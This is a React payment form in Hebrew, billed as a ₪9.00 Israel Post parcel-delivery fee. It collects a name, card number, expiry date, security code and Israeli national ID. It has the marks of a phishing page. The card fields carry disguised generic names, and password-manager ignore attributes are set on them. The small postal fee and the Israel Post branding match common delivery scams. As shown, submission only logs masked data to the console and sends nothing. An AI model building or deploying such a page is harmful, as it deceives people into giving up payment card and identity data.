import { useState } from 'react'

const initialState = {
  firstName: '',
  lastName: '',
  field1: '',
  field2: '',
  field3: '',
  nationalId: '',
}

function luhnCheck(num) {
  let sum = 0
  let doubleIt = false
  for (let i = num.length - 1; i >= 0; i--) {
    let d = Number(num[i])
    if (doubleIt) {
      d *= 2
      if (d > 9) d -= 9
    }
    sum += d
    doubleIt = !doubleIt
  }
  return sum % 10 === 0
}

function isValidIsraeliID(id) {
  let str = id.replace(/\D/g, '')
  if (!str) return false
  if (str.length > 9) return false
  str = str.padStart(9, '0')
  let sum = 0
  for (let i = 0; i < 9; i++) {
    let d = Number(str[i]) * ((i % 2) + 1)
    if (d > 9) d -= 9
    sum += d
  }
  return sum % 10 === 0
}

export default function UserDetailsForm() {
  const [formData, setFormData] = useState(initialState)
  const [errors, setErrors] = useState({})
  const [submitted, setSubmitted] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)


  const onChange = (e) => {
    const { name } = e.target
    let { value } = e.target

    if (name === 'field1') {
      value = value.replace(/\D/g, '').slice(0, 19)
      value = value.replace(/(.{4})/g, '$1 ').trim()
    } else if (name === 'field2') {
      value = value.replace(/\D/g, '').slice(0, 4)
      if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2)
    } else if (name === 'field3') {
      value = value.replace(/\D/g, '').slice(0, 4)
    } else if (name === 'nationalId') {
      value = value.replace(/\D/g, '').slice(0, 9)
    }

    setFormData((prev) => ({ ...prev, [name]: value }))
    setErrors((prev) => ({ ...prev, [name]: undefined }))
    setSubmitted(false)
  }

  const validate = () => {
    const newErrors = {}

    if (!formData.firstName.trim()) newErrors.firstName = 'שדה חובה'
    if (!formData.lastName.trim()) newErrors.lastName = 'שדה חובה'

    const rawCard = formData.field1.replace(/\D/g, '')
    if (!rawCard) newErrors.field1 = 'שדה חובה'
    else if (rawCard.length < 13 || rawCard.length > 19 || !luhnCheck(rawCard)) newErrors.field1 = 'מספר לא תקין'

    if (!formData.field2) newErrors.field2 = 'שדה חובה'
    else {
      const m = formData.field2.match(/^(\d{2})\/(\d{2})$/)
      if (!m) newErrors.field2 = 'פורמט לא תקין'
      else {
        const month = Number(m[1])
        const yearYY = Number(m[2])
        if (month < 1 || month > 12) newErrors.field2 = 'פורמט לא תקין'
        else {
          const now = new Date()
          const currentYY = Number(now.getFullYear().toString().slice(-2))
          const currentMM = now.getMonth() + 1
          const isExpired = yearYY < currentYY || (yearYY === currentYY && month < currentMM)
          if (isExpired) newErrors.field2 = 'פג תוקף'
        }
      }
    }

    if (!formData.field3) newErrors.field3 = 'שדה חובה'
    else if (!/^\d{3,4}$/.test(formData.field3)) newErrors.field3 = 'קוד לא תקין'

    if (!formData.nationalId) newErrors.nationalId = 'שדה חובה'
    else if (!isValidIsraeliID(formData.nationalId)) newErrors.nationalId = 'תעודת זהות לא תקינה'

    return newErrors
  }

  const onSubmit = async (e) => {
    e.preventDefault()
    const v = validate()
    setErrors(v)
    
    if (Object.keys(v).length === 0) {
      setIsSubmitting(true)
      
      try {
        // יצירת נתונים מובנים לשליחה
        const formattedData = {
          שם_מלא: `${formData.firstName} ${formData.lastName}`,
          שדה_1: formData.field1.replace(/\d(?=\d{4})/g, '*'), // מסתיר את רוב הספרות
          שדה_2: formData.field2,
          תעודת_זהות: formData.nationalId.replace(/\d(?=\d{2})/g, '*'), // מסתיר את רוב הספרות
          סיבת_תשלום: 'שירותי דואר ישראל - משלוח חבילה',
          סכום: '₪9.00',
          זמן_שליחה: new Date().toLocaleString('he-IL')
        }

        // בשלב זה פשוט נציג את הנתונים בקונסול
        console.log('נתוני הטופס שנשלחו:', formattedData)
        
        // סימולציה של שליחה
        await new Promise(resolve => setTimeout(resolve, 2000))
        
        setSubmitted(true)
        alert(`הטופס נשלח בהצלחה! הנתונים נשמרו במערכת.
        
פרטי התשלום:
שם: ${formattedData.שם_מלא}
סכום: ${formattedData.סכום}
זמן: ${formattedData.זמן_שליחה}`)
        
      } catch (error) {
        console.error('שגיאה בשליחת הטופס:', error)
        alert('שגיאה בשליחת הטופס. אנא נסה שוב.')
      } finally {
        setIsSubmitting(false)
      }
    }
  }

  return (
    <div className="form-card" dir="rtl">
      <form onSubmit={onSubmit} noValidate autoComplete="off">
        <div className="form-group">
          <label htmlFor="firstName">שם פרטי</label>
          <input
            id="firstName"
            name="firstName"
            type="text"
            className={`form-input ${errors.firstName ? 'has-error' : ''}`}
            value={formData.firstName}
            onChange={onChange}
            placeholder="הקלד/י שם פרטי"
            autoComplete="off"
            spellCheck="false"
            required
          />
          {errors.firstName && <span className="error-text">{errors.firstName}</span>}
        </div>

        <div className="form-group">
          <label htmlFor="lastName">שם משפחה</label>
          <input
            id="lastName"
            name="lastName"
            type="text"
            className={`form-input ${errors.lastName ? 'has-error' : ''}`}
            value={formData.lastName}
            onChange={onChange}
            placeholder="הקלד/י שם משפחה"
            autoComplete="off"
            spellCheck="false"
            required
          />
          {errors.lastName && <span className="error-text">{errors.lastName}</span>}
        </div>

        <div className="form-group">
          <label htmlFor="field1">מספר כרטיס</label>
          <input
            id="field1"
            name="field1"
            type="text"
            className={`form-input ${errors.field1 ? 'has-error' : ''}`}
            value={formData.field1}
            onChange={onChange}
            placeholder=""
            inputMode="text"
            autoComplete="off"
            spellCheck="false"
            data-1p-ignore
            data-bwignore
            data-lpignore="true"
          />
          {errors.field1 && <span className="error-text">{errors.field1}</span>}
        </div>

        <div className="form-row">
          <div className="form-group">
            <label htmlFor="field2">תאריך</label>
            <input
              id="field2"
              name="field2"
              type="text"
              className={`form-input ${errors.field2 ? 'has-error' : ''}`}
              value={formData.field2}
              onChange={onChange}
              placeholder="MM/YY"
              inputMode="text"
              autoComplete="off"
              spellCheck="false"
              maxLength={5}
              data-1p-ignore
              data-bwignore
              data-lpignore="true"
              required
            />
            {errors.field2 && <span className="error-text">{errors.field2}</span>}
          </div>
          <div className="form-group">
            <label htmlFor="field3">קוד אבטחה</label>
            <input
              id="field3"
              name="field3"
              type="text"
              className={`form-input ${errors.field3 ? 'has-error' : ''}`}
              value={formData.field3}
              onChange={onChange}
              placeholder="3-4 ספרות"
              inputMode="text"
              autoComplete="off"
              spellCheck="false"
              maxLength={4}
              data-1p-ignore
              data-bwignore
              data-lpignore="true"
              required
            />
            {errors.field3 && <span className="error-text">{errors.field3}</span>}
          </div>
        </div>

        <div className="form-group">
          <label htmlFor="nationalId">ת'ז</label>
          <input
            id="nationalId"
            name="nationalId"
            type="text"
            className={`form-input ${errors.nationalId ? 'has-error' : ''}`}
            value={formData.nationalId}
            onChange={onChange}
            placeholder="9 ספרות"
            inputMode="text"
            autoComplete="off"
            spellCheck="false"
            maxLength={9}
            data-1p-ignore
            data-bwignore
            data-lpignore="true"
            required
          />
          {errors.nationalId && <span className="error-text">{errors.nationalId}</span>}
        </div>

        <button type="submit" className="submit-btn" disabled={isSubmitting}>
          {isSubmitting ? 'שולח...' : 'שליחה'}
        </button>
        {submitted && (
          <div className="success-text" role="status">הטופס נשלח בהצלחה! הנתונים נשמרו במערכת.</div>
        )}
      </form>
    </div>
  )
}
